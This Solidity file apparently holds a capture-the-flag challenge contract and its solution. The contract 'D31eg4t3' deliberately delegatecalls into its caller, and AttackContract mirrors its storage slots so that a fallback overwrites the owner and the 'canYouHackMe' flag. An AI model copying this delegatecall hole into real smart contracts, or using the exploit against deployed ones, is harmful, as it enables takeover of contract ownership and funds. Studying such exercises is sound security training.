// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{

    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}

contract AttackContract{
	uint256 slot0;
	uint256 slot1;
	uint256 slot2;
	uint256 slot3;
	uint256 slot4;
	address owner;
	mapping(address => bool) public attackMap;

	function attack(address target) external {
		(bool success, ) = D31eg4t3(target).hackMe("");
		require(success, "failed.");
	}

	fallback() external {
		owner = tx.origin;
		attackMap[tx.origin] = true;
	}
}